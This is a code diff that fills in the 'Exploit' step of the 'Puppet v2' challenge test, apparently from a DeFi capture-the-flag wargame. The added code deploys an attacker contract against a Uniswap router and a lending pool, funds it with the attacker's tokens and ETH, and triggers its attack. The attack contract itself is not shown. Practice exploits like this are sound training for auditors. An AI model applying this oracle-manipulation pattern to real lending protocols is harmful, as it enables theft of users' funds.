@@ -81,7 +81,14 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const PuppetV2AttackerFactory = await ethers.getContractFactory("PuppetV2Attacker", attacker);
+        this.attackerContract = await PuppetV2AttackerFactory.deploy(this.uniswapRouter.address, this.lendingPool.address, this.token.address);
+
+        // Fund contract with DVT
+        const attackerDVTBalance = await this.token.balanceOf(attacker.address);
+        await this.token.connect(attacker).transfer(this.attackerContract.address, attackerDVTBalance);
+
+        await this.attackerContract.attack({ value: (await ethers.provider.getBalance(attacker.address)).sub(ethers.utils.parseEther('0.1'))});
     });
 
     after(async function () {
